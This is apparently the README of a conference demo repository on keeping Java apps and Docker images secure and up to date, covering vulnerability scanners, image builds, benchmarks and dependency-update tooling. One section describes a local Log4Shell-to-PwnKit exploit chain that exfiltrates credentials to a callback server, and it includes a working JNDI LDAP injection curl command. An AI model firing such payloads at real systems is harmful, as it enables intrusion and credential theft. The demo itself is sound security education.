# Keep Up To Date

Companion repository for the **"Keep Up To Date"** conference talk.
Each directory is a self-contained demo covering a different aspect of keeping
Java applications and Docker images secure, up-to-date, and well-tested.

The presentation and demos can be viewed via [GitHub Pages](https://johanjanssen.github.io/Keep-Up-To-Date).


---

## Prerequisites

| Requirement | Notes |
|---|---|
| **Docker** | All tools run as containers — no local installations needed |
| **Java 25** | Only if running Maven outside Docker (`./mvnw` wrapper is included) |
| **jq** | Required by scanning/comparison scripts ([download](https://jqlang.github.io/jq/download/)) |
| **Bash 4+** | Git Bash / WSL2 on Windows; native on macOS / Linux |
| **curl** | Used by exercise/readiness scripts |

---

## Repository Overview

| Directory | What it demonstrates | Quick Start |
|---|---|---|
| [Vulnerable Application/](#vulnerable-application) | Spring Boot app with **intentionally vulnerable** dependencies — the scan target | `./mvnw -f "Vulnerable Application/pom.xml" package` |
| [Vulnerable Application Old Java/](#vulnerable-application-old-java--callback-server) & [Callback Server/](#vulnerable-application-old-java--callback-server) | Java 17 / Spring Boot 2.7 target for a live, end-to-end Log4Shell RCE + PwnKit escalation demo, caught by a local "attacker" server | `cd "Callback Server" && ../mvnw spring-boot:run` |
| [Build Docker Images/](#build-docker-images) | 11 Docker image strategies (JRE, jlink, CRaC, GraalVM native) with size & startup benchmarks | `bash "Build Docker Images/build-all-images.sh"` |
| [Performance Improvement/](#performance-improvement) | JMH benchmarks proving Java 17→25→28 EA (Valhalla) gives free speed & memory wins | `bash "Performance Improvement/scripts/run-benchmarks.sh"` |
| [Grype/](#grype) | Image vulnerability scanning with Grype (Anchore) | `bash Grype/scripts/compare-images.sh` |
| [Trivy/](#trivy) | Image vulnerability scanning with Trivy (Aqua Security) | `bash Trivy/scripts/compare-images.sh` |
| [OWASP Dependency Check/](#owasp-dependency-check) | Maven dependency scanning against the NVD database | `bash "OWASP Dependency Check/scripts/run-check.sh"` |
| [Compare Security Scans/](#compare-security-scans) | Run Grype + Trivy + OWASP DC and compare results side-by-side | `bash "Compare Security Scans/scripts/run-all.sh"` |
| [OpenRewrite/](#openrewrite) | Automated migration: Spring Boot 2→4, Java 17→25, JUnit 4→5 | `bash OpenRewrite/scripts/run-openrewrite.sh` |
| [Old GroupIds Alerter/](#old-groupids-alerter) | Flags `pom.xml` dependencies declared under groupIds that moved (e.g. `javax.*` → `jakarta.*`) | `bash "Old GroupIds Alerter/scripts/run-oga.sh"` |
| [Maven Dependency Plugin/](#maven-dependency-plugin) | Finds unused `pom.xml` dependencies with `dependency:analyze` — and the JDBC-driver false positive it gets wrong | `bash "Maven Dependency Plugin/scripts/run-dependency-analyze.sh"` |
| [Testcontainers/](#testcontainers) | Integration testing with real PostgreSQL via `@ServiceConnection` | `bash Testcontainers/scripts/run-tests.sh` |
| [JaCoCo/](#jacoco) | Production-agent code coverage — detect dead code in running applications | `bash "JaCoCo/scripts/Retrieve Coverage From Port/run-demo.sh"` |
| [Renovate/](#renovate) | Local Gitea + Jenkins + Renovate bot — automated dependency update PRs | `bash Renovate/scripts/demo.sh` |

---

## Shared Configuration

**`images.conf`** at the project root is the single source of truth for all base
and application image names. It is sourced by every scanning and measurement script.

---

## Published Reports (GitHub Pages)

Every demo publishes its own results to
[GitHub Pages](https://johanjanssen.github.io/Keep-Up-To-Date) on each push to `master`,
under its own subfolder so no workflow's output overwrites another's:

| Path | Demo |
|---|---|
| [`/Presentation/`](https://johanjanssen.github.io/Keep-Up-To-Date/Presentation/) | The reveal.js conference slide deck |
| [`/vulnerable/`](https://johanjanssen.github.io/Keep-Up-To-Date/vulnerable/) | Vulnerable Application Old Java + Callback Server — full exploit chain demo |
| [`/images/`](https://johanjanssen.github.io/Keep-Up-To-Date/images/) | Build Docker Images — base OS & Java runtime image size comparison |
| [`/custom-images/`](https://johanjanssen.github.io/Keep-Up-To-Date/custom-images/) | Build Docker Images — hello-conference image size & startup performance comparison |
| [`/Benchmarks/`](https://johanjanssen.github.io/Keep-Up-To-Date/Benchmarks/) | Performance Improvement — Java 17 vs 25 vs 28 EA benchmarks |
| [`/Scans/`](https://johanjanssen.github.io/Keep-Up-To-Date/Scans/) | Compare Security Scans — Trivy vs Grype vs OWASP DC |
| [`/OWASP/`](https://johanjanssen.github.io/Keep-Up-To-Date/OWASP/) | OWASP Dependency Check |
| [`/OpenRewrite/`](https://johanjanssen.github.io/Keep-Up-To-Date/OpenRewrite/) | OpenRewrite migration recipes |
| [`/renamed/`](https://johanjanssen.github.io/Keep-Up-To-Date/renamed/) | Old GroupIds Alerter |
| [`/dependency/`](https://johanjanssen.github.io/Keep-Up-To-Date/dependency/) | Maven Dependency Plugin |
| [`/testcontainers/`](https://johanjanssen.github.io/Keep-Up-To-Date/testcontainers/) | Testcontainers |
| [`/JaCoCo/`](https://johanjanssen.github.io/Keep-Up-To-Date/JaCoCo/) | JaCoCo coverage report |
| [`/renovate/`](https://johanjanssen.github.io/Keep-Up-To-Date/renovate/) | Renovate — real PRs opened against the demo Gitea repo |

---

## Vulnerable Application

Spring Boot 4.1 / Java 25 web application with **intentionally vulnerable** dependencies:

| Dependency | Version | CVE | CVSS |
|---|---|---|---|
| `log4j-core` | `2.0` | CVE-2021-44228 (Log4Shell) | **10.0** |
| `jackson-databind` | `2.9.10` | CVE-2019-14379 + others | 9.8 |

Used as the scan target for Grype, Trivy, OWASP DC, and the Docker image builds.

---

## Vulnerable Application Old Java & Callback Server

A second, older target — Spring Boot **2.7** / Java **17**, `log4j-core 2.14.1` (pre-patch) —
plus a local "attacker" server, used together for a live, **end-to-end exploit chain** rather
than a static scan:

1. A single `curl` against the vulnerable app's search endpoint triggers a Log4Shell JNDI lookup.
2. The **Callback Server** (`Callback Server/`) answers on LDAP (port 1389) with a reference to a
   malicious class, and serves it over HTTP (port 9999) — its static initializer runs on the
   victim, performing recon and exfiltrating credentials/env vars back to the callback server, all
   visible on its live dashboard.
3. If the victim container is non-root (`Dockerfile.escalation`) and has `pkexec`/`gcc` available,
   a second stage attempts privilege escalation via PwnKit (CVE-2021-4034) — honestly reported as
   succeeding or failing depending on whether the target's `policykit-1` package is actually patched.

```bash
# Attacker server
cd "Callback Server" && ../mvnw spring-boot:run

# Victim app (root variant)
docker build -f "Vulnerable Application Old Java/Dockerfile.root" -t vuln-app:root "Vulnerable Application Old Java"
docker run -p 8080:8080 vuln-app:root

# Fire the exploit
curl "http://localhost:8080/api/products/search?q=\${jndi:ldap://localhost:1389/pwnkit}"
```

See [`Callback Server/README.md`](Callback%20Server/README.md) for the full attack chain, ports,
and endpoints. A GitHub Actions workflow (`demo-vulnerable-app.yml`) runs this end-to-end on every
push and publishes the transcript to
[GitHub Pages](https://johanjanssen.github.io/Keep-Up-To-Date/vulnerable/).

---

## Build Docker Images

Builds Docker image variants of the same Spring Boot app to compare size,
startup time, memory usage, and attack surface.

```bash
bash "Build Docker Images/build-all-images.sh"      # build everything
bash "Build Docker Images/measure-images.sh"         # image sizes + package counts
bash "Build Docker Images/measure-performance.sh"    # startup time + memory
```

| Image tag | Strategy | Runtime base |
|---|---|---|
| `jre-temurin` | Full JRE | `eclipse-temurin:25-jre` |
| `jre-temurin-alpine` | Full JRE (Alpine) | `eclipse-temurin:25-jre-alpine` |
| `jlink-full-distroless-base-debian` | jlink (all modules) | `distroless/base-debian13` |
| `jlink-distroless-base-debian` | jlink (minimal modules) | `distroless/base-debian13` |
| `jlink-netty-distroless-base-debian` | jlink (Netty-optimised) | `distroless/base-debian13` |
| `jlink-cds-distroless-base-debian` | jlink + CDS archive | `distroless/base-debian13` |
| `crac-azul-distroless-base-debian` | CRaC checkpoint/restore | `distroless/base-debian13` |
| `native-debian-slim` | GraalVM native image | `debian:13-slim` |
| `native-minimal-distroless-static-debian` | GraalVM native (minimal) | `distroless/static-debian13` |
| `native-scratch` | GraalVM native | `scratch` |
| `native-netty-scratch` | GraalVM native (Netty) | `scratch` |

---

## Performance Improvement

JMH benchmarks run on **Java 17**, **Java 25**, and **Java 28 EA** (Project Valhalla preview) to
show measurable, verified performance and memory improvements from upgrading the JDK alone —
plus the one Valhalla language change that needs an actual code edit (`record` → `value record`).
Results are only reported as a "win" when the current run's numbers back it up (≥3% better);
flat or regressed comparisons are left out rather than rounded up.

```bash
bash "Performance Improvement/scripts/run-benchmarks.sh"                          # run all benchmarks
python3 "Performance Improvement/scripts/generate-html-report.py" results/ results/html/index.html
```

Published on every run to
[GitHub Pages](https://johanjanssen.github.io/Keep-Up-To-Date/Benchmarks/). See
[`Performance Improvement/README.md`](Performance%20Improvement/README.md) for the full
benchmark breakdown, the Valhalla flattening size-limit finding, and what was cut and why.

---

## Grype

Container image vulnerability scanning with [Grype](https://github.com/anchore/grype)
(by Anchore). Scans OS packages + language dependencies.

```bash
bash Grype/scripts/update-db.sh                         # update vuln DB
bash Grype/scripts/scan-image.sh eclipse-temurin:25-jre  # scan one image
bash Grype/scripts/compare-images.sh                     # compare all images
```

---

## Trivy

Container image vulnerability scanning with [Trivy](https://github.com/aquasecurity/trivy)
(by Aqua Security). Scans OS packages + language dependencies.

```bash
bash Trivy/scripts/update-db.sh                         # update vuln DB
bash Trivy/scripts/scan-image.sh eclipse-temurin:25-jre  # scan one image
bash Trivy/scripts/compare-images.sh                     # compare all images
```

---

## OWASP Dependency Check

Scans Maven dependencies (not OS packages) against the NVD database.
Requires a local NVD cache server.

```bash
bash "OWASP Dependency Check/scripts/start-cache.sh"    # start local NVD mirror
bash "OWASP Dependency Check/scripts/update-cache.sh"    # download/refresh NVD data
bash "OWASP Dependency Check/scripts/run-check.sh"       # scan vulnerable dependencies
```

---

## Compare Security Scans

Runs Grype, Trivy, and OWASP DC against all images and produces comparison tables:
severity counts side-by-side, and OS-level vs application-level breakdown.

```bash
bash "Compare Security Scans/scripts/run-all.sh"
```

---

## OpenRewrite

Automated code migration using [OpenRewrite](https://docs.openrewrite.org) recipes:
Spring Boot 2.7→4.1, Java 17→25, JUnit 4→5, code style fixes.

```bash
bash OpenRewrite/scripts/run-openrewrite.sh                # apply all recipes
DRY_RUN=true bash OpenRewrite/scripts/run-openrewrite.sh   # preview only
```

---

## Old GroupIds Alerter

Checks `pom.xml` against a community-maintained list of dependencies that moved
to a new groupId — e.g. `com.graphql-java:graphql-java-tools` →
`com.graphql-java-kickstart:graphql-java-tools`, or the `javax.*` → `jakarta.*`
Jakarta EE relocation — using the
[Old GroupIds Alerter](https://github.com/jonathanlermitage/oga-maven-plugin) plugin.

```bash
bash "Old GroupIds Alerter/scripts/run-oga.sh"                # report only, build stays green
STRICT=true bash "Old GroupIds Alerter/scripts/run-oga.sh"    # plugin default — build fails
```

---

## Maven Dependency Plugin

Runs the [Maven Dependency Plugin](https://maven.apache.org/plugins/maven-dependency-plugin/)'s
`analyze` goal against a `pom.xml` with three intentionally chosen
dependencies: two genuinely unused (`commons-lang3`, `guava`) and one classic
**false positive** — an `h2` JDBC driver that's only ever reached via
`java.sql.DriverManager` and the JDBC 4 `ServiceLoader` mechanism, never a
direct import, so the plugin's bytecode scan flags it as unused too even
though a `/db-check` endpoint genuinely needs it at runtime.

```bash
bash "Maven Dependency Plugin/scripts/run-dependency-analyze.sh"                # report only, build stays green
STRICT=true bash "Maven Dependency Plugin/scripts/run-dependency-analyze.sh"    # opt-in CI gate — build fails
```

---

## Testcontainers

Integration tests with a real PostgreSQL container using Spring Boot's
`@ServiceConnection` — no `@DynamicPropertySource` boilerplate.

```bash
bash Testcontainers/scripts/run-tests.sh
```

---

## JaCoCo

Production-agent code coverage with JaCoCo — detect dead code by attaching the agent
to a running application. Two modes: TCP port-based (live dumps) and file-based (on JVM exit).

```bash
bash "JaCoCo/scripts/Retrieve Coverage From Port/run-demo.sh"   # port-based (fully automated)
bash "JaCoCo/scripts/Retrieve Coverage From File/run-demo.sh"   # file-based (fully automated)
```

---

## Renovate

Local Gitea + Jenkins + Renovate bot — fully automated dependency update PRs with CI
feedback. Renovate opens PRs, Jenkins builds them, and reports back to Gitea.

```bash
bash Renovate/scripts/demo.sh           # full automated demo (~10-15 min first run)
bash Renovate/scripts/reset-demo.sh     # clean up everything
```

A GitHub Action re-runs the Gitea + Renovate half of this demo on every push and weekly,
then publishes the real PRs it opened — titles, labels, and diffs — to
[GitHub Pages](https://johanjanssen.github.io/Keep-Up-To-Date/renovate/).

---

## Run Everything

A master script `run-all-demos.sh` exercises every demo in sequence to verify the
full setup is working:

```bash
bash run-all-demos.sh
```

> ⚠ **This takes a long time** (native image builds alone can take 20+ minutes each).
> It requires Docker, Java 25, jq, curl, and git. See the script header for details.
